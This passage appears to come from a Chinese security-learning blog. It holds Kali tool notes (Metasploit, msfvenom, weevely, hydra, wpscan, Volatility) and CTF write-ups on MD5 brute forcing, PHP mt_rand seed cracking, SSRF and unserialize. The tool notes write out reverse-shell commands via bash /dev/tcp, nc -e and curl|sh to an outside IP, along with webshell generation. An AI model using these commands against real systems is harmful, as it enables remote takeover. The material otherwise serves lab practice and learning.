class="line">-------                       ------------</span><br><span class="line">timestomp                     操作文件 MACE 属性</span><br><span class="line"></span><br><span class="line">meterpreter &gt;</span><br></pre></td></tr></table></figure>

<p><a href="https://blog.csdn.net/weixin_45588247/article/details/119614618">(4条消息) 【工具使用】——Metasploit(MSF)使用详解(超详细)_metasploit使用教程_剑客 getshell的博客-CSDN博客</a></p>
<h2 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h2><p><a href="https://blog.csdn.net/weixin_44268918/article/details/129771330">(9条消息) 云服务器在CentOS7中安装msf工具_centos7安装msf_剁椒鱼头没剁椒的博客-CSDN博客</a></p>
<h3 id="msfvenom"><a href="#msfvenom" class="headerlink" title="msfvenom"></a>msfvenom</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">msf5 &gt; use exploit/multi/handler </span><br><span class="line"></span><br><span class="line">msf5 exploit(multi/handler) &gt; set payload php/meterpreter/reverse_tcp</span><br><span class="line"></span><br><span class="line">msf5 exploit(multi/handler) &gt; set lhost 0.0.0.0</span><br><span class="line"></span><br><span class="line">msf5 exploit(multi/handler) &gt; set lport </span><br><span class="line"></span><br><span class="line">msf5 exploit(multi/handler) &gt; exploit</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.158.129 lport=4444 -f exe &gt;shell.exe</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">msfvenom -p php/meterpreter/reverse_tcp LHOST=101.43.182.125 LPORT=9999 R &gt; test.php</span><br></pre></td></tr></table></figure>

<h3 id="bash-反弹shell"><a href="#bash-反弹shell" class="headerlink" title="bash 反弹shell"></a>bash 反弹shell</h3><p><strong>查询当前shell命令</strong>  <strong>ls -l &#x2F;bin&#x2F;sh</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">bash -i &gt;&amp; /dev/tcp/101.43.182.125/5000 0&gt;&amp;1</span><br></pre></td></tr></table></figure>

<p>由于有的docker并没有bash命令，可以配合使用curl指令</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 1. On your machine:</span><br><span class="line">#      nc -l 1337</span><br><span class="line">#</span><br><span class="line"># 2. On the target machine:</span><br><span class="line">curl https://your-shell.com/yourip:1337 | sh</span><br></pre></td></tr></table></figure>



<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">curl https://your-shell.com/101.43.182.125:5000 | sh</span><br></pre></td></tr></table></figure>

<p>由于我的云服务器已经开起了http服务，但是我并不想在我的网站下放内容所以</p>
<p>可以使用python3 快速创建一个http 服务在某个端口</p>
<p>cd，到你想要的某个文件夹</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python3 -m http.server 端口</span><br></pre></td></tr></table></figure>

<p>在该端口下创建一个文件</p>
<h3 id="nc反弹shell"><a href="#nc反弹shell" class="headerlink" title="nc反弹shell"></a>nc反弹shell</h3><p>反向连接</p>
<p>攻击机执行：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nc -lvvp 12345</span><br></pre></td></tr></table></figure>

<p>靶机执行：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nc 101.43.182.125 5000 -e /bin/sh</span><br></pre></td></tr></table></figure>

<h2 id="weevely"><a href="#weevely" class="headerlink" title="weevely"></a>weevely</h2><p>linux中的菜刀</p>
<p><a href="https://blog.csdn.net/qq_45521281/article/details/106587791">(10条消息) Weevely(Linux中的菜刀)_zhang三的博客-CSDN博客</a></p>
<p>weevely:生成以及连接</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">weevely generate &lt;连接密码&gt; &lt;path&gt;</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">weevely &lt;url&gt; &lt;连接密码&gt;</span><br></pre></td></tr></table></figure>

<p>展示真实用户</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">:audit_etcpasswd -real</span><br></pre></td></tr></table></figure>

<p> 反弹shell </p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">backdoor_reversetcp 192.168.1.9 3366</span><br></pre></td></tr></table></figure>

<h2 id="tplmap-下载安装"><a href="#tplmap-下载安装" class="headerlink" title="tplmap 下载安装"></a>tplmap 下载安装</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">git clone https://github.com/epinna/tplmap</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pip install -r requirements.txt</span><br></pre></td></tr></table></figure>

<p>如果安装成功即可使用</p>
<p>若出<strong>error: subprocess-exited-with-error</strong>，这里我忘记截屏了则参考这个</p>
<p><a href="https://www.cnblogs.com/ktsm/p/15691652.html">kali 下安装tplmap - KittySmith - 博客园 (cnblogs.com)</a></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 进入家目录</span><br><span class="line">cd </span><br><span class="line"></span><br><span class="line">#建立目录ins-pip2</span><br><span class="line">mkdir ins-pip2</span><br><span class="line"></span><br><span class="line">#下载pip2安装脚本</span><br><span class="line">wget  https://bootstrap.pypa.io/pip/2.6/get-pip.py</span><br><span class="line"></span><br><span class="line">#python2执行 需要sudo权限</span><br><span class="line">sudo python2 get-pip.py</span><br><span class="line"></span><br><span class="line">#升级pip2</span><br><span class="line">sudo pip2 install --upgrade pip </span><br><span class="line"></span><br><span class="line">#安装pip2扩展工具，不然后面安装还是报错</span><br><span class="line">sudo pip2 install --upgrade setuptools </span><br></pre></td></tr></table></figure>

<h2 id="cewl使用"><a href="#cewl使用" class="headerlink" title="cewl使用"></a>cewl使用</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">选项:</span><br><span class="line">    -h, --help: 显示帮助信息.</span><br><span class="line">    -k, --keep: 保存下载的文件.</span><br><span class="line">    -d &lt;x&gt;,--depth &lt;x&gt;: 爬行到的深度，默认为2。</span><br><span class="line">    -m, --min_word_length: 最小字长，默认为3。</span><br><span class="line">    -o, --offsite: 让蜘蛛访问其他网站.</span><br><span class="line">    --exclude: 包含要排除的路径列表的文件</span><br><span class="line">    --allowed: 路径必须匹配才能遵循的正则表达式模式</span><br><span class="line">    -w, --write: 将输出写入文件。</span><br><span class="line">    -u, --ua &lt;agent&gt;: 要设置的用户代理.</span><br><span class="line">    -n, --no-words: 不要输出单词列表。</span><br><span class="line">    -g &lt;x&gt;, --groups &lt;x&gt;: 也返回单词组</span><br><span class="line">    --lowercase: 所有解析的单词小写</span><br><span class="line">    --with-numbers: 接受包含数字和字母的单词</span><br><span class="line">    --convert-umlauts: 转换通用ISO-8859-1 (Latin-1)的变体(ä-ae， ö-oe， ü-ue， ß-ss)</span><br><span class="line">    -a, --meta: 包括元数据。</span><br><span class="line">    --meta_file file: 元数据的输出文件。</span><br><span class="line">    -e, --email: 包括电子邮件地址。</span><br><span class="line">    --email_file &lt;file&gt;: 输出文件的电子邮件地址。</span><br><span class="line">    --meta-temp-dir &lt;dir&gt;: exiftool在解析文件时使用的临时目录，默认为/tmp。</span><br><span class="line">    -c, --count: 为每个单词发现显示计数。</span><br><span class="line">    -v, --verbose: 详细输出.</span><br><span class="line">    --debug: 额外的调试信息。</span><br><span class="line"></span><br><span class="line">    身份验证</span><br><span class="line">    --auth_type: Digest 或 basic.</span><br><span class="line">    --auth_user: 用户名。</span><br><span class="line">    --auth_pass: 密码身份验证.</span><br><span class="line"></span><br><span class="line">    代理支持</span><br><span class="line">    --proxy_host: 代理主机.</span><br><span class="line">    --proxy_port: 代理端口,默认8080.</span><br><span class="line">    --proxy_username: 如果需要，代理用户名.</span><br><span class="line">    --proxy_password: 如果需要，代理密码.</span><br><span class="line">    </span><br><span class="line">    Headers</span><br><span class="line">    --header, -H: 格式为name:value -可以传递多个</span><br></pre></td></tr></table></figure>

<h2 id="wpscan"><a href="#wpscan" class="headerlink" title="wpscan"></a>wpscan</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">wpscan -update  #升级漏洞库</span><br><span class="line">wpscan -u http://192.168.10.44   #扫描WordPress站点，可以使用 -u 或者 --url 参数都可</span><br><span class="line">wpscan -u http://192.168.10.44 --enumerate t  #主题扫描</span><br><span class="line">wpscan -u http://192.168.10.44 --enumerate vt  #主题扫描</span><br><span class="line">wpscan -u http://192.168.10.44 --enumerate p  #插件扫描</span><br><span class="line">wpscan -u http://192.168.10.44 --enumerate u  #枚举用户</span><br></pre></td></tr></table></figure>

<h2 id="Volatility3"><a href="#Volatility3" class="headerlink" title="Volatility3"></a>Volatility3</h2><p>2好像跑不出来，于是用了3，好累</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">git clone https://github.com/volatilityfoundation/volatility3.git</span><br></pre></td></tr></table></figure>

<p>cd到文件夹</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pip3 install -r requirements-minimal.txt</span><br><span class="line">pip3 install -r requirements.txt</span><br><span class="line">python3 setup.py build</span><br><span class="line">python3 setup.py install</span><br><span class="line">sudo apt install libsnappy-dev</span><br><span class="line">pip3 install distorm3</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line">常用插件：</span><br><span class="line">layerwriter：列出内存镜像platform信息</span><br><span class="line">linux.bash：从内存中恢复bash命令历史记录</span><br><span class="line">linux.check_afinfo：验证网络协议的操作功能指针</span><br><span class="line">linux.check_syscall：检查系统调用表中的挂钩</span><br><span class="line">linux.elfs：列出所有进程的所有内存映射ELF文件</span><br><span class="line">linux.lsmod：列出加载的内核模块</span><br><span class="line">linux.lsof：列出所有进程的所有内存映射</span><br><span class="line">linux.malfind：列出可能包含注入代码的进程内存范围</span><br><span class="line">linux.proc：列出所有进程的所有内存映射</span><br><span class="line">linux.pslist：列出linux内存映像中存在的进程</span><br><span class="line">linux.pstree：列出进程树</span><br><span class="line">mac.bash：从内存中恢复bash命令历史记录</span><br><span class="line">mac.check_syscall：检查系统调用表中的挂钩</span><br><span class="line">mac.check_sysctl：检查sysctl处理程序的挂钩</span><br><span class="line">mac.check_trap_table：检查trap表中的挂钩</span><br><span class="line">mac.ifconfig：列出网卡信息</span><br><span class="line">mac.lsmod：列出加载的内核模块</span><br><span class="line">mac.lsof：列出所有进程的所有内存映射</span><br><span class="line">mac.malfind：列出可能包含注入代码的进程内存范围</span><br><span class="line">mac.netstat：列出所有进程的所有网络连接</span><br><span class="line">mac.psaux：恢复程序命令行参数</span><br><span class="line">mac.pslist：列出linux内存映像中存在的进程</span><br><span class="line">mac.pstree：列出进程树</span><br><span class="line">mac.tasks：列出Mac内存映像中存在的进程</span><br><span class="line">windows.info：显示正在分析的内存样本的OS和内核详细信息</span><br><span class="line">windows.callbacks：列出内核回调和通知例程</span><br><span class="line">windows.cmdline：列出进程命令行参数</span><br><span class="line">windows.dlldump：将进程内存范围DLL转储</span><br><span class="line">windows.dlllist：列出Windows内存映像中已加载的dll模块</span><br><span class="line">windows.driverirp：在Windows内存映像中列出驱动程序的IRP</span><br><span class="line">windows.driverscan：扫描Windows内存映像中存在的驱动程序</span><br><span class="line">windows.filescan：扫描Windows内存映像中存在的文件对象</span><br><span class="line">windows.handles：列出进程打开的句柄</span><br><span class="line">windows.malfind：列出可能包含注入代码的进程内存范围</span><br><span class="line">windows.moddump：转储内核模块</span><br><span class="line">windows.modscan：扫描Windows内存映像中存在的模块</span><br><span class="line">windows.mutantscan：扫描Windows内存映像中存在的互斥锁</span><br><span class="line">windows.pslist：列出Windows内存映像中存在的进程</span><br><span class="line">windows.psscan：扫描Windows内存映像中存在的进程</span><br><span class="line">windows.pstree：列出进程树</span><br><span class="line">windows.procdump：转储处理可执行映像</span><br><span class="line">windows.registry.certificates：列出注册表中存储的证书</span><br><span class="line">windows.registry.hivelist：列出内存映像中存在的注册表配置单元</span><br><span class="line">windows.registry.hivescan：扫描Windows内存映像中存在的注册表配置单元</span><br><span class="line">windows.registry.printkey：在配置单元或特定键值下列出注册表项</span><br><span class="line">windows.registry.userassist：打印用户助手注册表项和信息</span><br><span class="line">windows.ssdt：列出系统调用表</span><br><span class="line">windows.strings：读取字符串命令的输出，并指示每个字符串属于哪个进程</span><br><span class="line">windows.svcscan：扫描Windows服务</span><br><span class="line">windows.symlinkscan：扫描Windows内存映像中存在的链接</span><br></pre></td></tr></table></figure>



<h2 id="john"><a href="#john" class="headerlink" title="john"></a>john</h2><p>md5 破解工具</p>
<p>使用方式，将文件保存在 1.txt</p>
<p>命令执行 </p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">john 1.txt</span><br></pre></td></tr></table></figure>

<h2 id="hydra-使用"><a href="#hydra-使用" class="headerlink" title="hydra 使用"></a>hydra 使用</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-l login 小写，指定用户名进行破解</span><br><span class="line">-L file 大写，指定用户的用户名字典</span><br><span class="line">-p pass 小写，用于指定密码破解，很少使用，一般采用密码字典。</span><br><span class="line">-P file 大写，用于指定密码字典。</span><br><span class="line">-e ns 额外的选项，n：空密码试探，s：使用指定账户和密码试探</span><br><span class="line">-M file 指定目标ip列表文件，批量破解。</span><br><span class="line">-o file 指定结果输出文件</span><br><span class="line">-f 找到第一对登录名或者密码的时候中止破解。</span><br><span class="line">-t tasks 同时运行的线程数，默认是16</span><br><span class="line">-w time 设置最大超时时间，单位</span><br><span class="line">-v / -V 显示详细过程</span><br><span class="line">-R 恢复爆破（如果破解中断了，下次执行 hydra -R /path/to/hydra.restore 就可以继续任务。）</span><br><span class="line">-x 自定义密码。</span><br></pre></td></tr></table></figure>

<h2 id="Nikto简介"><a href="#Nikto简介" class="headerlink" title="Nikto简介"></a>Nikto简介</h2><p>基于perl语言开发的web页面扫描器。其特点扫描全面，速度快。</p>
<p>nikto常用命令<br>-upodate                         升级，更新插件</p>
<p>-host                               扫描目标URl</p>
<p>-id username:password  http认证接口</p>
<p>-list-plugins                     列出所有可用的插件</p>
<p>-evasion                          IDS&#x2F;IPS逃避技术（实例演示里有详细信息）</p>
<p>-port                                指定端口（默认80）</p>
<p> -ssl                                 使用SSL</p>
<p>-useproxy                       使用http代理</p>
<p>-vhost  域名                    当一个IP拥有多个网站时 使用</p>
]]></content>
      <tags>
        <tag>kali</tag>
      </tags>
  </entry>
  <entry>
    <title>爆破</title>
    <url>/2023/04/29/%E7%88%86%E7%A0%B4/</url>
    <content><![CDATA[<p>ctfshow 爆破</p>
<span id="more"></span>

<h2 id="web23"><a href="#web23" class="headerlink" title="web23"></a>web23</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">include(&#x27;flag.php&#x27;);</span><br><span class="line">if(isset($_GET[&#x27;token&#x27;]))&#123;</span><br><span class="line">    $token = md5($_GET[&#x27;token&#x27;]);</span><br><span class="line">    if(substr($token, 1,1)===substr($token, 14,1) &amp;&amp; substr($token, 14,1) ===substr($token, 17,1))&#123;</span><br><span class="line">        if((intval(substr($token, 1,1))+intval(substr($token, 14,1))+substr($token, 17,1))/substr($token, 1,1)===intval(substr($token, 31,1)))&#123;</span><br><span class="line">            echo $flag;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;else&#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>爆破脚本</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span>=<span class="string">&quot;asdfghjklqwertyuiopzxcvbnm1234567890&quot;</span>;</span><br><span class="line"><span class="keyword">for</span>(<span class="variable">$i</span>=<span class="number">0</span>;<span class="variable">$i</span>&lt;<span class="number">36</span>;<span class="variable">$i</span>++)&#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="variable">$j</span>=<span class="number">0</span>;<span class="variable">$j</span>&lt;<span class="number">36</span>;<span class="variable">$j</span>++)&#123;</span><br><span class="line">        <span class="variable">$token</span>=<span class="variable">$a</span>[<span class="variable">$i</span>].<span class="variable">$a</span>[<span class="variable">$j</span>];</span><br><span class="line">        <span class="variable">$token</span> = <span class="title function_ invoke__">md5</span>(<span class="variable">$token</span>);</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">substr</span>(<span class="variable">$token</span>, <span class="number">1</span>,<span class="number">1</span>)===<span class="title function_ invoke__">substr</span>(<span class="variable">$token</span>, <span class="number">14</span>,<span class="number">1</span>) &amp;&amp; <span class="title function_ invoke__">substr</span>(<span class="variable">$token</span>, <span class="number">14</span>,<span class="number">1</span>) ===<span class="title function_ invoke__">substr</span>(<span class="variable">$token</span>, <span class="number">17</span>,<span class="number">1</span>))&#123;</span><br><span class="line">            <span class="keyword">if</span>((<span class="title function_ invoke__">intval</span>(<span class="title function_ invoke__">substr</span>(<span class="variable">$token</span>, <span class="number">1</span>,<span class="number">1</span>))+<span class="title function_ invoke__">intval</span>(<span class="title function_ invoke__">substr</span>(<span class="variable">$token</span>, <span class="number">14</span>,<span class="number">1</span>))+<span class="title function_ invoke__">substr</span>(<span class="variable">$token</span>, <span class="number">17</span>,<span class="number">1</span>))/<span class="title function_ invoke__">substr</span>(<span class="variable">$token</span>, <span class="number">1</span>,<span class="number">1</span>)===<span class="title function_ invoke__">intval</span>(<span class="title function_ invoke__">substr</span>(<span class="variable">$token</span>, <span class="number">31</span>,<span class="number">1</span>)))&#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="variable">$a</span>[<span class="variable">$i</span>].<span class="variable">$a</span>[<span class="variable">$j</span>];</span><br><span class="line">                <span class="keyword">exit</span>(<span class="number">0</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="number">3</span>j</span><br></pre></td></tr></table></figure>

<h2 id="web24"><a href="#web24" class="headerlink" title="web24"></a>web24</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">error_reporting(0);</span><br><span class="line">include(&quot;flag.php&quot;);</span><br><span class="line">if(isset($_GET[&#x27;r&#x27;]))&#123;</span><br><span class="line">    $r = $_GET[&#x27;r&#x27;];</span><br><span class="line">    mt_srand(372619038);</span><br><span class="line">    if(intval($r)===intval(mt_rand()))&#123;</span><br><span class="line">        echo $flag;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;else&#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">    echo system(&#x27;cat /proc/version&#x27;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">?&gt; </span><br></pre></td></tr></table></figure>



<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mt_srand() //播种 Mersenne Twister 随机数生成器。</span><br><span class="line">mt_rand()   //生成随机数</span><br></pre></td></tr></table></figure>

<p>我们会发现当种子不变时，实际上生成的随机数是固定的。而这就是伪随机数漏洞</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">mt_srand(372619038);</span><br><span class="line">echo (mt_rand());</span><br><span class="line">1155388967</span><br></pre></td></tr></table></figure>

<h2 id="web25"><a href="#web25" class="headerlink" title="web25"></a>web25</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">error_reporting(0);</span><br><span class="line">include(&quot;flag.php&quot;);</span><br><span class="line">if(isset($_GET[&#x27;r&#x27;]))&#123;</span><br><span class="line">    $r = $_GET[&#x27;r&#x27;];</span><br><span class="line">    mt_srand(hexdec(substr(md5($flag), 0,8)));</span><br><span class="line">    $rand = intval($r)-intval(mt_rand());</span><br><span class="line">    if((!$rand))&#123;</span><br><span class="line">        if($_COOKIE[&#x27;token&#x27;]==(mt_rand()+mt_rand()))&#123;</span><br><span class="line">            echo $flag;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">        echo $rand;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;else&#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">    echo system(&#x27;cat /proc/version&#x27;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>已知随机数爆破种子</p>
<p>使用工具<a href="https://www.openwall.com/php_mt_seed/">php_mt_seed - PHP mt_rand() seed cracker (openwall.com)</a></p>
<p><a href="https://www.openwall.com/php_mt_seed/php_mt_seed-4.0.tar.gz">php_mt_seed 4.0</a></p>
<p>下载解压，进入目录</p>
<ul>
<li>make</li>
<li>time .&#x2F;php_mt_seed 989670016</li>
</ul>
<p><img src="/2023/04/29/%E7%88%86%E7%A0%B4/QQ%E6%88%AA%E5%9B%BE20230501185137.png"></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">mt_srand</span>(<span class="number">2838855227</span>);</span><br><span class="line"><span class="keyword">echo</span> (<span class="title function_ invoke__">mt_rand</span>()).<span class="string">&quot;\n&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> (<span class="title function_ invoke__">mt_rand</span>()+<span class="title function_ invoke__">mt_rand</span>());</span><br><span class="line"><span class="number">989670016</span></span><br><span class="line"><span class="number">3064661505</span></span><br></pre></td></tr></table></figure>

<p>&#x2F;?r&#x3D;989670016</p>
<p>cookie: token&#x3D;3064661505</p>
<h2 id="web26"><a href="#web26" class="headerlink" title="web26"></a>web26</h2><p>爆破即可</p>
<p>密码 7758521</p>
<h2 id="web27"><a href="#web27" class="headerlink" title="web27"></a>web27</h2><p>抓不到包。。。写不了</p>
<h2 id="web28"><a href="#web28" class="headerlink" title="web28"></a>web28</h2><p>继续爆破一下目录</p>
<p><code>[1cd8c3a3-5c30-4219-93aa-489569d67004.challenge.ctf.show/0/1/2.txt](http://1cd8c3a3-5c30-4219-93aa-489569d67004.challenge.ctf.show/0/1/2.txt)</code></p>
<p>去掉2.txt</p>
<p>集束炸弹 cluster bomb 爆破一一下</p>
<p>爆破结果&#x2F;72&#x2F;20&#x2F;</p>
<h2 id="ctfshow萌新杯web16"><a href="#ctfshow萌新杯web16" class="headerlink" title="ctfshow萌新杯web16"></a>ctfshow萌新杯web16</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">\<span class="comment"># flag in config.php</span></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;config.php&quot;</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">md5</span>(<span class="string">&quot;ctfshow<span class="subst">$c</span>&quot;</span>)===<span class="string">&quot;a6f57ae38a22448c2f07f3f95f49c84e&quot;</span>)&#123;</span><br><span class="line">      <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">      <span class="keyword">echo</span> <span class="string">&quot;nonono!&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>解题思路</p>
<p>mport hashlib #建立爆破的字典str str&#x3D;’abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890+-*&#x2F;‘ #从一个字符开始尝试，逐渐往下加 for i in str: for j in str : for k in str: s&#x3D;hashlib.md5((‘ctfshow’+i+j+k).encode()).hexdigest() #让ctfshow和字符i,j,k拼接在一起，转化为MD5值，hexdigest函数实现字符存储 if s&#x3D;&#x3D; ‘a6f57ae38a22448c2f07f3f95f49c84e’:#判断值是否符合条件 print(i+j+k)#输出字符c的值 脚本输出36d 构造payload: ?c&#x3D;36d 得出flag</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import hashlib</span><br><span class="line">str1=&#x27;abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ&#x27;</span><br><span class="line">payload=&#x27;&#x27;</span><br><span class="line">for i in str1:</span><br><span class="line">    for j in str1:</span><br><span class="line">        for k in str1:</span><br><span class="line">            s = hashlib.md5((&#x27;ctfshow&#x27;+i+j+k).encode()).hexdigest()</span><br><span class="line">            #print(type(s))</span><br><span class="line">            if s==&#x27;a6f57ae38a22448c2f07f3f95f49c84e&#x27;:</span><br><span class="line">                print(i+j+k)</span><br></pre></td></tr></table></figure>

<p>或者</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import hashlib</span><br><span class="line">import string</span><br><span class="line">a=string.ascii_letters+string.digits</span><br></pre></td></tr></table></figure>

]]></content>
      <tags>
        <tag>ctfhsow</tag>
      </tags>
  </entry>
  <entry>
    <title>nss1</title>
    <url>/2023/04/14/nss1/</url>
    <content><![CDATA[<p>  部分nss的题</p>
  <span id="more"></span>

<h2 id="SWPUCTF-2021-新生赛-jicao"><a href="#SWPUCTF-2021-新生赛-jicao" class="headerlink" title="[SWPUCTF 2021 新生赛]jicao"></a>[SWPUCTF 2021 新生赛]jicao</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="string">&#x27;index.php&#x27;</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"><span class="variable">$id</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;id&#x27;</span>];</span><br><span class="line"><span class="variable">$json</span>=<span class="title function_ invoke__">json_decode</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;json&#x27;</span>],<span class="literal">true</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$id</span>==<span class="string">&quot;wllmNB&quot;</span>&amp;&amp;<span class="variable">$json</span>[<span class="string">&#x27;x&#x27;</span>]==<span class="string">&quot;wllm&quot;</span>)</span><br><span class="line">&#123;<span class="keyword">echo</span> <span class="variable">$flag</span>;&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p><a href="https://www.php.net/manual/zh/function.json-encode.php">PHP: json_encode - Manual</a></p>
<p>payload:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/?json=&#123;&quot;x&quot;:&quot;wllm&quot;&#125;</span><br><span class="line">post id=wllmNB</span><br></pre></td></tr></table></figure>

<h2 id="NISACTF-2022-easyssrf"><a href="#NISACTF-2022-easyssrf" class="headerlink" title="[NISACTF 2022]easyssrf"></a>[NISACTF 2022]easyssrf</h2><p>打开后随便curl一下试试</p>
<p><code>http://127.0.0.1/flag</code></p>
<p>看到：都说了这里看不了flag。。但是可以看看提示文件：&#x2F;fl4g</p>
<p>找不到打不开</p>
<p>换成php伪协议</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">file:///fl4g</span><br></pre></td></tr></table></figure>

<p>三个杠意思根目录下的fl4g</p>
<p>出现了</p>
<p>你应该看看除了index.php，是不是还有个ha1x1ux1u.php</p>
<p>意思是在ha1x1ux1u.php与index.php同一目录，访问一下</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&quot;file&quot;</span>];</span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">stristr</span>(<span class="variable">$file</span>, <span class="string">&quot;file&quot;</span>))&#123;</span><br><span class="line">  <span class="keyword">die</span>(<span class="string">&quot;你败了.&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//flag in /flag</span></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$file</span>);</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?file=/flag</span><br></pre></td></tr></table></figure>

<p>既然提示在根目录下叫flag,也懒得用伪协议找了</p>
<p>NSSCTF{0c36f2e6-8b20-4fa3-ab78-9ee0e0725d40}</p>
<h2 id="ez-unserialize"><a href="#ez-unserialize" class="headerlink" title="ez_unserialize"></a>ez_unserialize</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">error_reporting(0);</span><br><span class="line">show_source(&quot;cl45s.php&quot;);</span><br><span class="line"></span><br><span class="line">class wllm&#123;</span><br><span class="line"></span><br><span class="line">    public $admin;</span><br><span class="line">    public $passwd;</span><br><span class="line"></span><br><span class="line">    public function __construct()&#123;</span><br><span class="line">        $this-&gt;admin =&quot;user&quot;;</span><br><span class="line">        $this-&gt;passwd = &quot;123456&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">        public function __destruct()&#123;</span><br><span class="line">        if($this-&gt;admin === &quot;admin&quot; &amp;&amp; 